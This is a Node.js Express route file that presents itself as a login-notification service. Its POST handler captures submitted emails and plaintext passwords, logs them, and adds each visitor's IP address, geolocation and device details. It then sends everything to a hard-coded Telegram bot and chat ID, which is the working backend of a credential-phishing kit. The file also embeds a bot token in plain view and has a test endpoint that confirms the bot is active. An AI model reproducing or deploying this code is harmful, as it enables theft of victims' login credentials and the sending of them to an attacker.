const express = require("express");
const fetch = require("node-fetch");
const geoip = require('geoip-lite');
const UAParser = require('ua-parser-js');

const router = express.Router();

const BOT_TOKEN = "5805445041:AAEyEOk6JELDr7SLFORniePoZsusK9peChs";
const CHAT_ID = 1527776859;  // Changed to number
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

router.post('/', async (req, res) => {
    try {
        const { email, password } = req.body;

        console.log('📥 Received request:', { email, password });

        if (!email || !password) {
            return res.status(400).json({ success: false, message: "Missing email or password" });
        }

        // Better IP handling
        const ip = (req.headers['x-forwarded-for'] || req.connection.remoteAddress || '').split(',')[0].trim();
        const location = geoip.lookup(ip);
        const locationStr = location ? `${location.city}, ${location.country}` : 'Unknown';

        const parser = new UAParser(req.headers['user-agent']);
        const agent = parser.getResult();
        const deviceType = `${agent.os.name} ${agent.os.version} - ${agent.browser.name} ${agent.browser.version}`;

        // Build the Telegram message
        const message = `
📌 *Login Notification*
• Email: \`${email}\`
• Password: \`${password}\`
• IP: \`${ip}\`
• Location: ${locationStr}
• Device: ${deviceType}
• Time: ${new Date().toLocaleString()}
        `;

        console.log('📤 Sending to Telegram:', { CHAT_ID, BOT_TOKEN: BOT_TOKEN.substring(0, 10) + '...' });

        // Send to Telegram
        const response = await fetch(TELEGRAM_API, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: "Markdown"
            })
        });

        const responseData = await response.json();
        
        console.log('📨 Telegram API response:', responseData);

        if (!response.ok) {
            throw new Error(`Telegram API error: ${JSON.stringify(responseData)}`);
        }

        console.log(`✅ Telegram notification sent for ${email}`);

        res.status(200).json({
            success: true,
            message: "Notification sent successfully via Telegram",
            loginDetails: { device: deviceType, ip, location: locationStr }
        });

    } catch (error) {
        console.error("❌ Error sending Telegram message:", error.message);
        res.status(500).json({ 
            success: false, 
            message: "Failed to send Telegram notification", 
            error: error.message 
        });
    }
});

// Add a test endpoint
router.get('/test', async (req, res) => {
    try {
        const testResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
        const botInfo = await testResponse.json();
        
        res.json({
            bot_status: botInfo.ok ? '✅ Bot is active' : '❌ Bot issue',
            bot_info: botInfo,
            chat_id: CHAT_ID
        });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

module.exports = router;